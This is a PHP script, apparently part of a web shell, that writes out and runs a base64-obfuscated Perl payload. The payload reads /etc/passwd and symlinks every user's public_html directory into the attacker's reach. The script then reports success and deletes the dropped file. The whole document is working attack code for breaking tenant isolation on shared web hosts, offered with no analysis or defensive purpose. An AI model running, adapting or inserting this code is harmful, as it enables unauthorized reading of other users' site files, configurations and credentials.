<?php
$fileS = base64_decode("IyEvdXNyL2Jpbi9wZXJsCm9wZW4gSU5QVVQsICI8L2V0Yy9wYXNzd2QiOwp3aGls
ZSAoIDxJTlBVVD4gKQp7CiRsaW5lPSRfOyBAc3BydD1zcGxpdCgvOi8sJGxpbmUp
OyAkdXNlcj0kc3BydFswXTsKc3lzdGVtKCdsbiAtcyAvaG9tZS8nLiR1c2VyLicv
cHVibGljX2h0bWwgJyAuICR1c2VyKTsKfQ==");

$fpS = @fopen("PL-Symlink.pl",'w');
$fwS = @fwrite($fpS,$fileS);

if ($fwS) {
	$TEST=@file('/etc/passwd');
	if (!$TEST) {
		echo "<font color=red>[+] Can't Read /etc/passwd File .</font><BR>";
		echo "<font color=red>[+] Can't Create Users Shortcuts .</font><BR>";
		echo '<font color=red>[+] Finish !</font><BR>';
	}
	else {
		echo @shell_exec("perl PL-Symlink.pl");
		echo '<font color=green>[+] Users Shortcut Created .</font><BR>';
		echo '<font color=green>[+] Finish !</font><BR>';
	}
	@fclose($fpS);
	@unlink("PL-Symlink.pl");
}
?>